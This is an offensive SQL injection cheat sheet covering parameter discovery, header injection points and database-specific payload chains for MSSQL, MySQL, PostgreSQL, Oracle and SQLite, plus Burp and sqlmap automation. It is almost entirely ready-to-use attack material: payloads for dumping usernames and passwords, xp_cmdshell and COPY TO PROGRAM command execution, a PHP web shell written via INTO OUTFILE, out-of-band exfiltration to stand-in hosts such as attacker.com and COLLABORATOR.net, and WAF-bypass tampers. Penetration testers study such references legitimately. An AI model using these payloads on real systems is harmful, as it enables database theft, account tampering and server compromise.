# Web Application SQL Injection — Deep Reference

## INJECTION POINT DISCOVERY

### Parameter Mining Workflow
```bash
# 1. Historical URL mining
echo "target.com" | gau --subs | grep -E '[?&].*=' | uro | sort -u > params.txt
echo "target.com" | waybackurls | grep '=' | uro >> params.txt

# 2. Active crawl
katana -u https://target.com -d 5 -jc -ef png,jpg,gif,css,woff,svg -kf all -o katana.txt
cat katana.txt | grep '=' | grep -v '\.css\|\.js$' >> params.txt

# 3. Extract unique params for targeted testing
cat params.txt | grep -oP '(?<=[?&])[^=&]+' | sort -u > unique_params.txt

# 4. JS endpoint + param extraction
cat katana.txt | grep '\.js$' | while read url; do
  curl -s "$url" | grep -oP '(?<=fetch\(|axios\.get\(|\.get\()["\x27][^"'\'']+' 
done | sort -u
```

### Hidden Parameter Discovery
```bash
# Fuzz for hidden params with Arjun
arjun -u https://target.com/page -m GET

# x8 for fast hidden param discovery
x8 -u "https://target.com/page?FUZZ=test" -w /path/to/params.txt

# ffuf for param fuzzing
ffuf -u "https://target.com/page?FUZZ=1" -w /path/to/params.txt -fs BASELINE_SIZE
```

---

## COOKIE & HEADER INJECTION

These are massively underreported — most scanners miss them.

```
Headers to test:
  Cookie: session=VALUE; user=INJECT_HERE
  X-Forwarded-For: INJECT_HERE
  X-Real-IP: INJECT_HERE
  Referer: https://evil.com/INJECT_HERE
  User-Agent: Mozilla/5.0 INJECT_HERE
  X-Custom-Header: INJECT_HERE
  Accept-Language: en-US,INJECT_HERE
  X-Request-ID: INJECT_HERE (logging → 2nd order!)
  Authorization: Bearer INJECT_HERE (JWT payload)
```

**Burp approach**: Right-click request → Send to Intruder → Mark all values → Sniper mode → fire single quote first.

---

## MSSQL ADVANCED

```sql
-- Stacked queries (if allowed):
'; INSERT INTO users(username,password,role) VALUES('hacked','hacked','admin')--
'; EXEC xp_cmdshell('whoami')--  (if sysadmin)

-- Blind with binary search:
'; IF (ASCII(SUBSTRING((SELECT TOP 1 name FROM sysdatabases),1,1))>64) WAITFOR DELAY '0:0:3'--

-- Error-based full chain:
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))--
' AND 1=CONVERT(int,(SELECT TOP 1 CAST(username+CHAR(58)+password AS NVARCHAR) FROM users))--

-- OOB via linked server / xp_dirtree:
'; EXEC master..xp_dirtree '//'+CAST(@@version AS VARCHAR(100))+'.attacker.com/x'--
```

---

## MYSQL ADVANCED

```sql
-- Error-based (extractvalue — limit 32 chars per output):
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=database()),0x7e))--

-- Error-based (updatexml):
' AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--

-- UNION full chain:
' ORDER BY 3--                          (find columns)
' UNION SELECT NULL,NULL,NULL--         (confirm 3 cols)
' UNION SELECT NULL,database(),NULL--   (extract DB name)
' UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT NULL,group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,concat(username,0x3a,password),NULL FROM users LIMIT 1 OFFSET 0--

-- File read (if FILE privilege):
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--

-- File write (if secure_file_priv=''):
' UNION SELECT NULL,'<?php system($_GET[cmd]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--

-- Complex group_concat bypass (when column limit exists):
' UNION SELECT NULL,group_concat(username,0x3a,password ORDER BY 1 SEPARATOR 0x0a),NULL FROM users--
```

---

## POSTGRESQL ADVANCED

```sql
-- Error-based:
' AND CAST((SELECT version()) AS INT)=1--
' AND CAST((SELECT current_database()) AS INT)=1--
' AND CAST((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') AS INT)=1--

-- Stacked queries:
'; INSERT INTO users(username,password) VALUES('injected','password123')--
'; COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned'--   (RCE if superuser)

-- OOB:
'; COPY (SELECT current_database()) TO PROGRAM 'curl http://COLLABORATOR.net/'||current_database()--

-- Time-based:
'; SELECT CASE WHEN (SELECT LENGTH(current_database()))>1 THEN pg_sleep(3) ELSE pg_sleep(0) END--
```

---

## ORACLE ADVANCED

```sql
-- Must use FROM dual in Oracle:
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT banner,NULL FROM v$version--
' UNION SELECT table_name,NULL FROM all_tables WHERE rownum=1--

-- Error-based:
' AND 1=UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE rownum=1))--
' UNION SELECT XMLType('<x>'||(SELECT banner FROM v$version WHERE rownum=1)||'</x>'),NULL FROM dual--

-- OOB:
' UNION SELECT UTL_HTTP.REQUEST('http://COLLABORATOR.net/'||(SELECT banner FROM v$version WHERE rownum=1)),NULL FROM dual--
' UNION SELECT UTL_HTTP.REQUEST('http://COLLABORATOR.net/'||(SELECT username FROM all_users WHERE rownum=1)),NULL FROM dual--
```

---

## SQLITE ADVANCED

```sql
-- Schema:
' UNION SELECT NULL,name,sql FROM sqlite_master WHERE type='table'--
' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 0--

-- Extract columns from schema:
' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE name='users'--

-- Data:
' UNION SELECT NULL,group_concat(username||':'||password),NULL FROM users--

-- Version:
' UNION SELECT NULL,sqlite_version(),NULL--
```

---

## IN-BAND RESPONSE PATTERNS

| Response Signal | What It Means |
|----------------|---------------|
| DB error message visible | Error-based exploitable immediately |
| Response body changes with boolean | Blind boolean confirmed |
| Response delay (3-5s) consistent | Time-based confirmed |
| DNS/HTTP in Collaborator | OOB confirmed |
| HTTP 500 on quote only | Likely injectable, probe DBMS |
| HTTP 403 on payload | WAF blocking — attempt bypass |
| Same response always | Either not injectable OR fully blind |

---

## BATCH TESTING WITH BURP

1. Send to Intruder — Sniper mode
2. Mark parameter value as payload position
3. Payload list (initial probing, ordered for speed):
```
'
"
`
')
")
' OR '1'='1
1 AND 1=1--
1 AND 1=2--
' AND 1=1--
' AND 1=2--
1' AND SLEEP(3)--
1'; WAITFOR DELAY '0:0:3'--
1' AND pg_sleep(3)--
' AND extractvalue(1,concat(0x7e,version()))--
' AND 1=CONVERT(int,@@version)--
```
4. Grep → Match: `syntax error|mysql|sql server|oracle|pg_|PostgreSQL|ORA-|SQLite`
5. Analyze response length differences for boolean/blind

---

## AUTOMATION POST-CONFIRMATION

```bash
# Smart sqlmap invocation:
sqlmap -u "URL?id=CONFIRMED_POINT" \
  --dbms=mysql \                     # specify known DBMS
  --technique=BEUST \                # all techniques
  --level=5 --risk=3 \              # thorough
  --batch \                          # no prompts
  --threads=5 \                      # parallel
  --dbs \                            # dump DB names
  --tamper=space2comment,between    # WAF bypass

# Ghauri (better WAF bypass native):
ghauri -u "URL?id=CONFIRMED_POINT" --dbs --level=3 --batch

# Custom tamper script for specific WAF:
# space2comment: SELECT/**/version()
# between: 1 AND 2 → 1 bEtWeEn 1 AND 2
# randomcase: union → uNiOn
```
